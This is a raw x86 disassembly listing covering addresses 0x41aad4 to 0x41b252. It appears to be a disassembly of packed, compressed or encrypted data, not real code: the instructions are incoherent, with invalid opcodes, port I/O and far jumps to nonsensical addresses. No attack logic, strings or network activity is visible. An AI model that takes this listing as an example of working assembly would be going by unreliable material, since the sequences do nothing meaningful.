  41aad4:	and    DWORD PTR [edx+0x6477b9aa],esi
  41aada:	dec    ecx
  41aadb:	rcr    DWORD PTR [esi+0x7e119a5e],1
  41aae1:	or     al,0x1e
  41aae3:	clc    
  41aae4:	fadd   QWORD PTR [edx]
  41aae6:	mov    ebp,0x32155919
  41aaeb:	xchg   esi,eax
  41aaec:	xchg   esi,eax
  41aaed:	arpl   WORD PTR [eax+edi*4-0x5870b07f],bx
  41aaf4:	mov    esi,edi
  41aaf6:	jp     0x41aaf9
  41aaf8:	fst    DWORD PTR [edx-0x5]
  41aafb:	mov    ds:0xe167a6c2,al
  41ab00:	pop    ds
  41ab01:	sub    ah,BYTE PTR [ecx+ebp*8+0x52f13ed4]
  41ab08:	lods   eax,DWORD PTR ds:[esi]
  41ab09:	repnz std 
  41ab0b:	aas    
  41ab0c:	mov    ah,bh
  41ab0e:	mov    al,ds:0x30b03a73
  41ab13:	jecxz  0x41ab65
  41ab15:	rcr    ah,cl
  41ab17:	jnp    0x41aae3
  41ab19:	fsubp  st(2),st
  41ab1b:	leave  
  41ab1c:	sub    eax,0x40f8ed0b
  41ab21:	movntq QWORD PTR [edi-0x6a6e2d81],mm1
  41ab28:	shl    ch,cl
  41ab2a:	dec    eax
  41ab2b:	sub    ah,BYTE PTR [ebx-0x45]
  41ab2e:	test   al,0xb3
  41ab30:	or     eax,0x3cfb2fce
  41ab35:	fiadd  WORD PTR [esi]
  41ab37:	test   ebx,ebp
  41ab39:	pop    es
  41ab3a:	test   DWORD PTR [ebx],edi
  41ab3c:	je     0x41ab73
  41ab3e:	lahf   
  41ab3f:	jl     0x41ab09
  41ab41:	or     ebx,DWORD PTR [ecx+0x2e9dba5e]
  41ab47:	mov    esp,0x9baee5a5
  41ab4c:	sbb    ebx,edx
  41ab4e:	leave  
  41ab4f:	jge    0x41ab6b
  41ab51:	xchg   ecx,eax
  41ab52:	fucomi st,st(4)
  41ab54:	retf   0xeecb
  41ab57:	pushf  
  41ab58:	stos   BYTE PTR es:[edi],al
  41ab59:	gs out dx,eax
  41ab5b:	sahf   
  41ab5c:	inc    ecx
  41ab5d:	xor    ecx,esi
  41ab5f:	jmp    0xcbbfd052
  41ab64:	imul   esp,DWORD PTR [eax],0xffffffb3
  41ab67:	and    dl,dh
  41ab69:	adc    dl,BYTE PTR [ecx]
  41ab6b:	fadd   QWORD PTR [edi-0x76998f9e]
  41ab71:	(bad)  
  41ab72:	pop    edx
  41ab73:	adc    DWORD PTR [ebx-0x12],0x1d5512dc
  41ab7a:	lods   al,BYTE PTR ds:[esi]
  41ab7b:	aaa    
  41ab7c:	popa   
  41ab7d:	test   al,0xa5
  41ab7f:	xchg   ebp,eax
  41ab80:	xor    DWORD PTR [ecx+0x66],0xc5d118ab
  41ab87:	rcr    al,cl
  41ab89:	clc    
  41ab8a:	pop    eax
  41ab8b:	inc    bp
  41ab8d:	mov    al,ds:0xa22df97c
  41ab92:	jmp    0x41ab7b
  41ab94:	out    0x2c,al
  41ab96:	xor    ebp,DWORD PTR [ecx-0x43]
  41ab99:	inc    esi
  41ab9a:	push   0x233b924a
  41ab9f:	sbb    eax,0x12a87d1d
  41aba4:	mov    bh,0x5
  41aba6:	shr    DWORD PTR [ebp+0x17],0x0
  41abaa:	cmp    BYTE PTR [esp+edx*2-0x2f4266b8],0x4
  41abb2:	arpl   WORD PTR [esi+0xe],dx
  41abb5:	adc    edx,DWORD PTR [ebx+ebp*2]
  41abb8:	and    al,BYTE PTR [ebx-0x25]
  41abbb:	lock inc ecx
  41abbd:	sbb    edx,ebp
  41abbf:	cmp    al,0x9b
  41abc1:	inc    ebp
  41abc2:	mov    ecx,0xde7520f7
  41abc7:	test   BYTE PTR [ebx-0xa],ah
  41abca:	lea    ebx,[esi-0x302cd856]
  41abd0:	icebp  
  41abd1:	mov    ebx,0x4c88772a
  41abd6:	sbb    edx,DWORD PTR [edi]
  41abd8:	add    al,BYTE PTR [eax+0x62d37456]
  41abde:	jns    0x41ac1c
  41abe0:	jl     0x41ab62
  41abe2:	xchg   esp,eax
  41abe3:	aas    
  41abe4:	push   0x57
  41abe6:	inc    ebx
  41abe7:	call   0xb8142bab
  41abec:	inc    edi
  41abed:	mov    ah,0x67
  41abef:	mov    ecx,0xe5c9533f
  41abf4:	enter  0x899e,0x6
  41abf8:	sub    BYTE PTR [eax],dl
  41abfa:	cmp    ah,BYTE PTR [ecx]
  41abfc:	scas   al,BYTE PTR es:[edi]
  41abfd:	out    0x5a,eax
  41abff:	call   0xb000:0x7bdd75ac
  41ac06:	std    
  41ac07:	mov    dl,0x2a
  41ac09:	les    eax,FWORD PTR [esi-0x1]
  41ac0c:	add    BYTE PTR [eax-0x50],ch
  41ac0f:	xor    al,0x4b
  41ac11:	or     dh,dh
  41ac13:	leave  
  41ac14:	mov    ah,0x91
  41ac16:	push   eax
  41ac17:	mov    ds:0xec2e4d7b,eax
  41ac1c:	fucomip st,st(2)
  41ac1e:	push   edx
  41ac1f:	leave  
  41ac20:	das    
  41ac21:	jmp    0x3afa:0xc3d74c31
  41ac28:	test   BYTE PTR [eax],al
  41ac2a:	enter  0xf679,0x47
  41ac2e:	cmp    esi,DWORD PTR [ebx+0x5fa44e9a]
  41ac34:	test   BYTE PTR ds:0x52322c04,dh
  41ac3a:	push   esi
  41ac3b:	or     al,BYTE PTR [ebp+0x12e1c2f1]
  41ac41:	fcmove st,st(3)
  41ac43:	ror    al,1
  41ac45:	sub    eax,0xdfe42251
  41ac4a:	stc    
  41ac4b:	int3   
  41ac4c:	nop
  41ac4d:	push   esi
  41ac4e:	test   BYTE PTR [ebx],dl
  41ac50:	pushf  
  41ac51:	sar    dl,cl
  41ac53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac54:	adc    DWORD PTR [edi],esi
  41ac56:	mov    al,ds:0x5dc1a470
  41ac5b:	call   DWORD PTR [ecx+0x6b7f14a7]
  41ac61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac62:	lds    ebx,FWORD PTR [esi-0x1886bf45]
  41ac68:	inc    esp
  41ac69:	ror    DWORD PTR [edx+edi*4+0x7aae3607],1
  41ac70:	lahf   
  41ac71:	inc    eax
  41ac72:	jge    0x41ac3c
  41ac74:	in     eax,dx
  41ac75:	add    eax,0xaa78e22f
  41ac7a:	sahf   
  41ac7b:	std    
  41ac7c:	mov    bh,0x73
  41ac7e:	bound  ebp,QWORD PTR [eax+0x9aed794]
  41ac84:	fisttp WORD PTR [edx+eiz*2]
  41ac87:	popf   
  41ac88:	add    eax,0xbecddf79
  41ac8d:	(bad)  
  41ac8f:	lock std 
  41ac91:	neg    dh
  41ac93:	xor    bl,BYTE PTR [esi]
  41ac95:	xchg   ebp,eax
  41ac96:	jnp    0x41ac43
  41ac98:	iret   
  41ac99:	fst    DWORD PTR [bx+si+0x3ece]
  41ac9e:	repz pop ds
  41aca0:	cld    
  41aca1:	loopne 0x41aca2
  41aca3:	dec    esp
  41aca4:	ret    
  41aca5:	mov    dh,BYTE PTR [eax]
  41aca7:	xor    BYTE PTR [ebx-0x42],ch
  41acaa:	jg     0x41acf4
  41acac:	sbb    eax,DWORD PTR [ecx]
  41acae:	cmp    al,0x97
  41acb0:	sbb    BYTE PTR [edx+0x2f0d0814],ch
  41acb6:	dec    eax
  41acb7:	adc    al,0x8b
  41acb9:	mov    dh,0x8f
  41acbb:	xchg   dh,dl
  41acbd:	add    edi,DWORD PTR [eax-0x2bcdd2e5]
  41acc3:	cdq    
  41acc4:	inc    eax
  41acc5:	ret    
  41acc6:	fwait
  41acc7:	cmp    cl,BYTE PTR [edi]
  41acc9:	mov    eax,0x7178faaa
  41acce:	mov    dh,0xcd
  41acd0:	nop
  41acd1:	sub    eax,0x23d89907
  41acd6:	sbb    dh,bh
  41acd8:	es ss fs repnz int 0x35
  41acde:	xchg   esi,eax
  41acdf:	int    0x3e
  41ace1:	sub    eax,0x504fea20
  41ace6:	int    0xc7
  41ace8:	pop    eax
  41ace9:	loope  0x41acaf
  41aceb:	enter  0xb3ff,0xbf
  41acef:	scas   eax,DWORD PTR es:[edi]
  41acf0:	push   0xffffff8e
  41acf2:	xchg   ecx,eax
  41acf3:	inc    ebx
  41acf4:	lahf   
  41acf5:	mov    al,0xd5
  41acf7:	xlat   BYTE PTR ds:[ebx]
  41acf8:	stc    
  41acf9:	leave  
  41acfa:	push   ebx
  41acfb:	dec    ecx
  41acfc:	ins    DWORD PTR es:[edi],dx
  41acfd:	(bad)  
  41acfe:	xchg   ebx,eax
  41acff:	and    eax,0xaf78f1f0
  41ad04:	and    DWORD PTR [ebp-0x494889c9],eax
  41ad0a:	in     al,0x8b
  41ad0c:	(bad)  
  41ad0d:	mov    dl,0x5d
  41ad0f:	mov    cl,0xe0
  41ad11:	add    BYTE PTR [ebx+0x40],0xf2
  41ad15:	mov    al,0xf4
  41ad17:	pop    es
  41ad18:	fst    QWORD PTR [edx+0x36]
  41ad1b:	call   0xd4a6c7d8
  41ad20:	fdiv   st(0),st
  41ad22:	cmp    DWORD PTR [edi],ebp
  41ad24:	lods   al,BYTE PTR ds:[esi]
  41ad25:	shr    dh,1
  41ad27:	lahf   
  41ad28:	push   ebp
  41ad29:	push   0xeec28dd
  41ad2e:	mov    cl,0x7d
  41ad30:	pusha  
  41ad31:	lds    edx,FWORD PTR [edi]
  41ad33:	or     eax,0xc73e6855
  41ad38:	cmp    BYTE PTR [esi+0x4a63b0a5],0xd7
  41ad3f:	or     DWORD PTR [edi+0x29eedf58],esi
  41ad45:	imul   edx,ebx,0xffffffb8
  41ad48:	jne    0x41adb3
  41ad4a:	retf   0xe2b8
  41ad4d:	scas   al,BYTE PTR es:[edi]
  41ad4e:	sbb    edx,esi
  41ad50:	imul   ebp,DWORD PTR [esi-0x466627b0],0x8dc8120e
  41ad5a:	pop    ds
  41ad5b:	mov    ds:0xab6590d1,eax
  41ad60:	je     0x41add1
  41ad62:	fstp   TBYTE PTR [ecx]
  41ad64:	add    eax,0xb10bb8c3
  41ad69:	lods   eax,DWORD PTR ds:[esi]
  41ad6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6b:	in     al,dx
  41ad6c:	jns    0x41ad85
  41ad6e:	cmp    DWORD PTR [ebx-0x73],ebp
  41ad71:	sub    ebx,esp
  41ad73:	sbb    BYTE PTR [eax-0x45081c06],ch
  41ad79:	jne    0x41ad84
  41ad7b:	inc    esi
  41ad7c:	lods   al,BYTE PTR ds:[esi]
  41ad7d:	jp     0x41ade9
  41ad7f:	repz test BYTE PTR [esi],dl
  41ad82:	jb     0x41adc0
  41ad84:	shl    BYTE PTR [edi-0x26fc682e],0x42
  41ad8b:	sbb    DWORD PTR [ebp-0x7a1cabfb],ebp
  41ad91:	arpl   WORD PTR [ebx],di
  41ad93:	popf   
  41ad94:	mov    al,BYTE PTR [ecx]
  41ad96:	mov    cl,BYTE PTR [ebp-0x61]
  41ad99:	mov    ?,esi
  41ad9b:	cmp    BYTE PTR [edx],ch
  41ad9d:	lahf   
  41ad9e:	jecxz  0x41ade9
  41ada0:	test   eax,0xf5435df8
  41ada5:	cli    
  41ada6:	mov    BYTE PTR [ecx-0x37],al
  41ada9:	fst    QWORD PTR [ebp+0x293096a8]
  41adaf:	cmp    eax,eax
  41adb1:	xchg   esp,eax
  41adb2:	push   esi
  41adb3:	fisttp QWORD PTR [edi]
  41adb5:	and    ax,0xa735
  41adb9:	push   eax
  41adba:	xchg   DWORD PTR [ecx-0x25e42188],edi
  41adc0:	mov    al,ds:0x7139f145
  41adc5:	repz cs popa 
  41adc8:	pop    esp
  41adc9:	push   ebp
  41adca:	outs   dx,BYTE PTR ds:[esi]
  41adcb:	dec    esp
  41adcc:	sub    DWORD PTR [esi],edx
  41adce:	jnp    0x41ada8
  41add0:	push   edi
  41add1:	xor    al,0x57
  41add3:	cld    
  41add4:	mov    eax,0x7c5602df
  41add9:	icebp  
  41adda:	shl    DWORD PTR [edx+edi*1],0x7d
  41adde:	xchg   edi,eax
  41addf:	cmp    al,0x80
  41ade1:	dec    ebx
  41ade2:	mov    edx,0x5ce4ba37
  41ade7:	and    ch,bl
  41ade9:	or     ecx,esi
  41adeb:	(bad)  
  41adec:	sar    esi,0xc
  41adef:	jmp    0xdf603184
  41adf4:	mov    dl,0xd5
  41adf6:	jnp    0x41add3
  41adf8:	mov    cx,0x9e6f
  41adfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adfd:	sbb    al,0x5c
  41adff:	inc    edi
  41ae00:	dec    ebx
  41ae01:	adc    BYTE PTR [esi-0x73],dh
  41ae04:	in     eax,dx
  41ae05:	mov    ecx,0xaf3a15cd
  41ae0a:	clc    
  41ae0b:	sub    BYTE PTR [esi],bl
  41ae0d:	pop    ebx
  41ae0e:	pop    edi
  41ae0f:	mov    ds:0xf4749089,eax
  41ae14:	out    dx,eax
  41ae15:	das    
  41ae16:	cs mov edi,0x4e1f73d8
  41ae1c:	sahf   
  41ae1d:	pavgw  mm6,QWORD PTR [edi+0x5d7e2f58]
  41ae24:	inc    esp
  41ae25:	int3   
  41ae26:	loop   0x41ae6f
  41ae28:	cli    
  41ae29:	lods   al,BYTE PTR ds:[esi]
  41ae2a:	outs   dx,DWORD PTR ds:[esi]
  41ae2b:	pop    edi
  41ae2c:	aam    0x15
  41ae2e:	ins    DWORD PTR es:[edi],dx
  41ae2f:	dec    ecx
  41ae30:	mov    esi,DWORD PTR [esi]
  41ae32:	ret    
  41ae33:	dec    ecx
  41ae34:	xchg   ebp,eax
  41ae35:	and    bh,cl
  41ae37:	xor    ecx,DWORD PTR ds:0x63dfec93
  41ae3d:	jmp    0x41ae8e
  41ae3f:	lea    edi,[ebx+eiz*8+0xa]
  41ae43:	xor    eax,0x80608d4f
  41ae48:	push   eax
  41ae49:	push   edx
  41ae4a:	stos   BYTE PTR es:[edi],al
  41ae4b:	in     eax,0x5
  41ae4d:	sbb    eax,0x83eaf6e6
  41ae52:	fdiv   DWORD PTR [esp+ebx*8]
  41ae55:	push   ecx
  41ae56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae57:	fisttp WORD PTR [eax+edi*1-0x1b]
  41ae5b:	add    BYTE PTR [ecx-0x66],ch
  41ae5e:	push   0x16
  41ae60:	mov    DWORD PTR [ecx-0xa4ae30c],edi
  41ae66:	push   ss
  41ae67:	or     al,0x9b
  41ae69:	rcl    BYTE PTR [esi-0x7398c72e],0x2e
  41ae70:	xchg   ebx,eax
  41ae71:	loop   0x41aea8
  41ae73:	aad    0x3
  41ae75:	sbb    DWORD PTR [edi],edi
  41ae77:	pop    ecx
  41ae78:	add    DWORD PTR [ebx-0x67ea112],0x5d13e02f
  41ae82:	retf   0xe7df
  41ae85:	jno    0x41ae1c
  41ae87:	jl     0x41aeb9
  41ae89:	(bad)  
  41ae8a:	mov    ecx,0x1b0a2d93
  41ae8f:	xchg   ebx,eax
  41ae90:	jmp    0x41ae70
  41ae92:	nop
  41ae93:	loopne 0x41ae9b
  41ae95:	pop    edx
  41ae96:	mov    dl,0x9a
  41ae98:	jmp    0x590bf3c6
  41ae9d:	mov    ch,0x6d
  41ae9f:	jae    0x41aea5
  41aea1:	or     al,0x3a
  41aea3:	jo     0x41aebe
  41aea5:	jmp    0x41ae85
  41aea7:	popf   
  41aea8:	popa   
  41aea9:	daa    
  41aeaa:	mov    ebx,0x4205f59c
  41aeaf:	or     bl,ch
  41aeb1:	or     al,0x82
  41aeb3:	fcomp  QWORD PTR [edi-0x4f7360e4]
  41aeb9:	inc    edi
  41aeba:	je     0x41ae54
  41aebc:	and    cl,cl
  41aebe:	sub    al,0x73
  41aec0:	aad    0x25
  41aec2:	mov    bh,0xe0
  41aec4:	mov    eax,ds:0x9f9a358
  41aec9:	push   es
  41aeca:	adc    al,0xa2
  41aecc:	sub    eax,0xfdb1112d
  41aed1:	bound  esi,QWORD PTR [edi-0xa1438a1]
  41aed7:	sub    ecx,DWORD PTR [ebx-0x42c6ba56]
  41aedd:	repz push esi
  41aedf:	sbb    BYTE PTR ds:0xc6f3ef87,dh
  41aee5:	mov    cl,0xd3
  41aee7:	clc    
  41aee8:	xchg   edi,eax
  41aee9:	jmp    0x41af13
  41aeeb:	(bad)  [edi]
  41aeed:	jmp    0x41af51
  41aeef:	cmovnp edi,DWORD PTR [edx+ebx*1+0xc]
  41aef4:	fimul  DWORD PTR [ecx]
  41aef6:	shl    BYTE PTR [ebx+0x4b],1
  41aef9:	sti    
  41aefa:	into   
  41aefb:	adc    eax,0xda45ca0e
  41af00:	popf   
  41af01:	cmp    BYTE PTR [ebp-0x5e],0xe4
  41af05:	or     BYTE PTR [eax-0xdfc746],ah
  41af0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0c:	mov    ecx,0xf7b22a5f
  41af11:	or     eax,0xb4f320c6
  41af16:	push   es
  41af17:	mov    ebx,0x27878603
  41af1c:	test   DWORD PTR [eax],ebx
  41af1e:	add    al,0xed
  41af20:	xor    eax,0x9e6402a6
  41af25:	xchg   ecx,eax
  41af26:	les    ebp,FWORD PTR [eax]
  41af28:	call   0xad38d22d
  41af2d:	jbe    0x41af39
  41af2f:	or     ebp,DWORD PTR [di-0x1952]
  41af34:	cld    
  41af35:	add    ebp,DWORD PTR [edx+esi*8-0x5ca60fa4]
  41af3c:	pop    edi
  41af3d:	mov    al,ds:0x3c8fe3b4
  41af42:	call   0xd10eb119
  41af47:	ret    0xa053
  41af4a:	retf   
  41af4b:	xchg   ecx,ebp
  41af4d:	jle    0x41af55
  41af4f:	out    0x3f,al
  41af51:	pop    ds
  41af52:	cmp    DWORD PTR [esi-0x5090c18b],edx
  41af58:	iret   
  41af59:	rcl    cl,0xc1
  41af5c:	jae    0x41afae
  41af5e:	scas   eax,DWORD PTR es:[edi]
  41af5f:	(bad)  
  41af60:	test   BYTE PTR [esi+0x61],cl
  41af63:	mov    WORD PTR [ebx-0xd],cs
  41af66:	mov    ah,0x1d
  41af68:	jg     0x41af78
  41af6a:	dec    eax
  41af6b:	inc    edx
  41af6c:	shl    esp,cl
  41af6e:	cwde   
  41af6f:	sar    DWORD PTR [esi+edi*1+0x3ceaf8a3],1
  41af76:	dec    eax
  41af77:	test   BYTE PTR [ecx-0x7eb1c48],ch
  41af7d:	mov    ds:0x5312597c,al
  41af82:	cmp    DWORD PTR [ecx],ecx
  41af84:	loop   0x41afff
  41af86:	cld    
  41af87:	xchg   DWORD PTR [eax+0x35],esi
  41af8a:	imul   eax,DWORD PTR [edi+0x414f361],0x62562f67
  41af94:	ins    DWORD PTR es:[edi],dx
  41af95:	xchg   edi,eax
  41af96:	xor    BYTE PTR [edx+0x597cdb43],cl
  41af9c:	mov    edi,0xff40263c
  41afa1:	fxch   st(0)
  41afa3:	out    dx,eax
  41afa4:	in     eax,0x19
  41afa6:	sbb    BYTE PTR [ebx-0x61d6f805],ch
  41afac:	and    eax,0x361872a1
  41afb1:	idiv   DWORD PTR [edi+eiz*8+0x3381d0e]
  41afb8:	mov    dl,0xdc
  41afba:	inc    esi
  41afbb:	push   ds
  41afbc:	jae    0x41af64
  41afbe:	(bad)
  41afc2:	push   eax
  41afc3:	mov    edx,DWORD PTR [edi]
  41afc5:	mov    dl,0x35
  41afc7:	dec    esp
  41afc8:	pusha  
  41afc9:	add    eax,0x18e4c2d
  41afce:	cmp    ebx,DWORD PTR [eax+edi*4]
  41afd1:	xchg   DWORD PTR [edi-0x131f08d4],eax
  41afd7:	pushf  
  41afd8:	push   es
  41afd9:	jecxz  0x41af83
  41afdb:	sti    
  41afdc:	jge    0x41aff0
  41afde:	and    eax,0x1e257637
  41afe4:	sub    al,0xc2
  41afe6:	pop    ds
  41afe7:	out    0x42,al
  41afe9:	mov    bl,0xf
  41afeb:	and    BYTE PTR [edi+ebx*8+0x19],dh
  41afef:	sub    al,0x11
  41aff1:	cmp    BYTE PTR [esi],bl
  41aff3:	stos   BYTE PTR es:[edi],al
  41aff4:	mov    cl,BYTE PTR [edi]
  41aff6:	mov    bl,0x5f
  41aff8:	inc    esp
  41aff9:	mov    eax,0x4124902a
  41affe:	jge    0x41b039
  41b000:	dec    esp
  41b001:	ret    0xd27f
  41b004:	cmp    al,0x30
  41b006:	mov    ecx,0xdc00fdea
  41b00b:	retfw  0x314
  41b00f:	mov    ds:0x9af0b589,al
  41b014:	in     al,0xb3
  41b016:	in     al,dx
  41b017:	push   cs
  41b018:	jl     0x41b00a
  41b01a:	ja     0x41afc0
  41b01c:	fisttp WORD PTR [ecx]
  41b01e:	cmp    dh,BYTE PTR ds:0xa7205607
  41b024:	xchg   edx,eax
  41b025:	inc    eax
  41b026:	in     eax,dx
  41b027:	xlat   BYTE PTR ds:[ebx]
  41b028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b029:	lods   al,BYTE PTR ds:[esi]
  41b02a:	xor    eax,DWORD PTR ss:[edi+ecx*2-0x5fa63060]
  41b032:	pushf  
  41b033:	pop    eax
  41b034:	sbb    ah,BYTE PTR [eax-0x30bb0a]
  41b03a:	fnstenv [ecx+0xa]
  41b03d:	sub    al,0xd6
  41b03f:	adc    eax,0x95200411
  41b044:	dec    esp
  41b045:	jg     0x41b0b6
  41b047:	loope  0x41afdc
  41b049:	(bad)  
  41b04b:	stc    
  41b04c:	and    DWORD PTR [esi-0x33f4f70f],eax
  41b052:	add    al,0xc8
  41b054:	retf   
  41b055:	pusha  
  41b056:	xchg   esp,eax
  41b057:	add    eax,0x7ef60408
  41b05c:	stc    
  41b05d:	ins    BYTE PTR es:[edi],dx
  41b05e:	loopne 0x41b016
  41b060:	ss out dx,eax
  41b062:	lods   eax,DWORD PTR ds:[esi]
  41b063:	cmp    DWORD PTR [eax],0x5b
  41b066:	shl    BYTE PTR [edi+ebx*4+0x4a2d4101],cl
  41b06d:	inc    esp
  41b06e:	pop    ebx
  41b06f:	addr16 bswap eax
  41b072:	jl     0x41b0a6
  41b074:	mov    al,ds:0xb67bb0e7
  41b079:	cld    
  41b07a:	push   edi
  41b07b:	and    esp,ebx
  41b07d:	clc    
  41b07e:	push   ebx
  41b07f:	mov    edi,DWORD PTR [eax-0x61]
  41b082:	and    dl,ah
  41b084:	push   cs
  41b085:	or     eax,0x4a2f82b0
  41b08b:	sahf   
  41b08c:	jo     0x41b026
  41b08e:	mov    eax,0x51ca714c
  41b093:	xchg   ebx,eax
  41b094:	sbb    ah,cl
  41b096:	aaa    
  41b097:	stos   BYTE PTR es:[edi],al
  41b098:	int3   
  41b099:	test   BYTE PTR [edi],0x5a
  41b09c:	jge    0x41b0aa
  41b09e:	inc    esp
  41b09f:	sbb    edi,DWORD PTR ss:[ebx+0x678a1151]
  41b0a6:	or     BYTE PTR [edi-0x6a],ah
  41b0a9:	add    DWORD PTR [edi+ebp*2-0x6178313e],ebp
  41b0b0:	mov    bh,bh
  41b0b2:	aad    0x5a
  41b0b4:	out    0xa0,eax
  41b0b6:	push   es
  41b0b7:	or     BYTE PTR [ebx],ch
  41b0b9:	and    eax,DWORD PTR [eax-0x41]
  41b0bc:	ins    BYTE PTR es:[edi],dx
  41b0bd:	imul   esi,DWORD PTR [eax],0xffffff92
  41b0c0:	pusha  
  41b0c1:	repnz lods eax,DWORD PTR ds:[esi]
  41b0c3:	je     0x41b04c
  41b0c5:	or     al,0x8b
  41b0c7:	out    dx,al
  41b0c8:	rcr    ebp,1
  41b0ca:	or     bh,BYTE PTR [edx+0x5d7e1823]
  41b0d0:	inc    esi
  41b0d1:	mov    ebx,0x7bc4d188
  41b0d6:	mov    al,0xbe
  41b0d8:	xor    DWORD PTR [ecx+0x9],ecx
  41b0db:	ror    dl,0x35
  41b0de:	inc    ebx
  41b0df:	jns    0x41b080
  41b0e1:	fist   WORD PTR [edi+0x72]
  41b0e4:	mov    ah,0x3
  41b0e6:	adc    eax,0x2eb5df85
  41b0eb:	icebp  
  41b0ec:	pop    ecx
  41b0ed:	ins    BYTE PTR es:[edi],dx
  41b0ee:	jns    0x41b0fb
  41b0f0:	data16 and BYTE PTR [edi-0x69098747],0xbf
  41b0f8:	mov    ds:0xd8f91910,al
  41b0fd:	es sbb eax,0x2b371d4e
  41b103:	or     BYTE PTR [ecx],ah
  41b105:	jns    0x41b0ae
  41b107:	inc    esp
  41b108:	das    
  41b109:	scas   al,BYTE PTR es:[edi]
  41b10a:	sahf   
  41b10b:	outs   dx,DWORD PTR ds:[esi]
  41b10c:	push   ebx
  41b10d:	adc    al,0x22
  41b10f:	mov    BYTE PTR [edi+0x5f],bh
  41b112:	lods   al,BYTE PTR ds:[esi]
  41b113:	mov    ?,WORD PTR [eax+esi*8+0x1ab7aada]
  41b11a:	cld    
  41b11b:	fs pop ebx
  41b11d:	and    eax,ebp
  41b11f:	enter  0xaa3b,0x68
  41b123:	add    DWORD PTR [ebp-0x5f161174],edi
  41b129:	sar    eax,0xf5
  41b12c:	arpl   WORD PTR [esp+ecx*1],bx
  41b12f:	loope  0x41b106
  41b131:	xchg   ebp,eax
  41b132:	mov    dl,0x15
  41b134:	push   edi
  41b135:	clc    
  41b136:	push   ebx
  41b137:	mov    esp,0x59dfa4fd
  41b13c:	stc    
  41b13d:	aaa    
  41b13e:	push   ss
  41b13f:	sbb    DWORD PTR [edi+0x64],eax
  41b142:	ds mov dh,BYTE PTR es:[edi]
  41b146:	and    al,0x9a
  41b148:	mov    ch,0x47
  41b14a:	jge    0x41b1a5
  41b14c:	mov    eax,0xb2acc663
  41b151:	mov    ebp,0x6910836a
  41b156:	pop    es
  41b157:	dec    ebx
  41b158:	mov    DWORD PTR [ebx-0x5],esi
  41b15b:	out    0x6e,al
  41b15d:	xor    ebp,edx
  41b15f:	aas    
  41b160:	sbb    ecx,edi
  41b162:	mov    esp,0x900a61b8
  41b167:	pop    edi
  41b168:	ja     0x41b131
  41b16a:	aam    0x7e
  41b16c:	jmp    0x41b17b
  41b16e:	retf   0x81d3
  41b171:	fsubp  st(2),st
  41b173:	cmp    eax,0x6f8b47dd
  41b178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b179:	and    ebx,DWORD PTR [ebx-0x24]
  41b17c:	dec    edi
  41b17d:	lods   eax,DWORD PTR ds:[esi]
  41b17e:	cld    
  41b17f:	push   ecx
  41b180:	popa   
  41b181:	ffreep st(2)
  41b183:	sbb    BYTE PTR [ecx],ah
  41b185:	loope  0x41b1f2
  41b187:	aam    0x74
  41b189:	push   ax
  41b18b:	test   esi,esi
  41b18d:	clc    
  41b18e:	adc    esi,esp
  41b190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b191:	and    ebp,DWORD PTR [ebx+0x4d]
  41b194:	fwait
  41b195:	in     eax,0x88
  41b197:	scas   al,BYTE PTR es:[edi]
  41b198:	(bad)
  41b19d:	call   0x56d7:0xd4dd8e4f
  41b1a4:	jae    0x41b1b1
  41b1a6:	aas    
  41b1a7:	out    0x75,al
  41b1a9:	inc    ebx
  41b1aa:	xlat   BYTE PTR ds:[ebx]
  41b1ab:	bound  ecx,QWORD PTR [ebx+0x42780fbf]
  41b1b1:	imul   DWORD PTR [esi-0x681ae2a0]
  41b1b7:	pop    esi
  41b1b8:	lods   eax,DWORD PTR ds:[esi]
  41b1b9:	cmp    BYTE PTR [esp+ebp*8+0x29],al
  41b1bd:	aas    
  41b1be:	lods   eax,DWORD PTR ds:[esi]
  41b1bf:	cmp    al,0xb4
  41b1c1:	inc    ebx
  41b1c2:	pop    esp
  41b1c3:	or     bh,BYTE PTR [eax-0xf]
  41b1c6:	xchg   esi,eax
  41b1c7:	ficom  WORD PTR [esi]
  41b1c9:	call   0xb6b6:0x3e3bfa9d
  41b1d0:	outs   dx,BYTE PTR ds:[esi]
  41b1d1:	push   es
  41b1d2:	cs loopne 0x41b22f
  41b1d5:	dec    edx
  41b1d6:	mov    ch,0xc
  41b1d8:	xchg   edx,eax
  41b1d9:	addr16 int3 
  41b1db:	sub    DWORD PTR [edi+0x1737d010],0xd3830e4b
  41b1e5:	or     DWORD PTR [edx+0x19],esp
  41b1e8:	cmp    al,0x8f
  41b1ea:	xor    edx,edx
  41b1ec:	mov    al,ds:0xef1a0585
  41b1f1:	pop    eax
  41b1f2:	add    BYTE PTR [esp+ecx*8],dl
  41b1f5:	mov    BYTE PTR [eax-0x5c],ah
  41b1f8:	sar    ecx,cl
  41b1fa:	xor    ebp,0xd855785f
  41b200:	mov    edi,0xd9226969
  41b205:	hlt    
  41b206:	or     al,0x29
  41b208:	jno    0x41b23d
  41b20a:	ins    DWORD PTR es:[edi],dx
  41b20b:	sbb    edx,0x1d
  41b20e:	push   ebx
  41b20f:	scas   eax,DWORD PTR es:[edi]
  41b210:	adc    al,0x36
  41b212:	mov    ebp,0x5726774e
  41b217:	call   0x6517:0xc2ba466
  41b21e:	pop    edx
  41b21f:	sti    
  41b220:	scas   eax,DWORD PTR es:[edi]
  41b221:	mov    dh,0xb1
  41b223:	cmp    dh,BYTE PTR [eax+edi*2]
  41b226:	cmc    
  41b227:	sbb    ah,bl
  41b229:	or     BYTE PTR [edx],0xe1
  41b22c:	icebp  
  41b22d:	xor    BYTE PTR ds:0xe322e9,cl
  41b233:	jmp    0x3b09:0x8a2c2f31
  41b23a:	pop    esp
  41b23b:	aas    
  41b23c:	pop    esp
  41b23d:	and    BYTE PTR [ecx-0x7d],dl
  41b240:	js     0x41b230
  41b242:	add    al,0xec
  41b244:	daa    
  41b245:	dec    ebx
  41b246:	or     dh,BYTE PTR [ecx]
  41b248:	add    BYTE PTR [esp+ebx*2-0x7679679f],0x7e
  41b250:	or     cl,bl
  41b252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
